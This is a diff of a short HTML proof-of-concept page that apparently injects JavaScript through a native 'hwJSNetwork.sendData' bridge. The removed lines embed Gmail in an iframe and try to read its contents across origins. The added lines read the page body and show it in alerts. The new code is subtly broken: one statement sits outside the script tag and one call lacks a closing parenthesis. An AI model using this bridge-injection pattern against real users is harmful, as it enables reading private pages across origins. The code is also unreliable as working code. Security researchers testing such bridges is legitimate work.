@@ -1,7 +1,6 @@
 <body>
-<iframe src="https://mail.google.com/mail/" id="me2"></iframe>
+console.log(window.location.origin);
 <script>
-  hwJSNetwork.sendData("https://", "GET", "", "", "var i = document.createElement('iframe'); i.id = 'me'; i.src = 'https://mail.google.com/mail/'; window.document.body.appendChild(i); dummy");
-  hwJSNetwork.sendData("https://", "GET", "", "", "window.alert(1); var body = window.document.getElementById('me').contentDocument; window.alert(body); dummy");
+  hwJSNetwork.sendData("https://", "GET", "", "", "window.alert(1); var body = window.document.body.innerHTML; window.alert(body.slice(100); dummy");
 </script>
 </body>
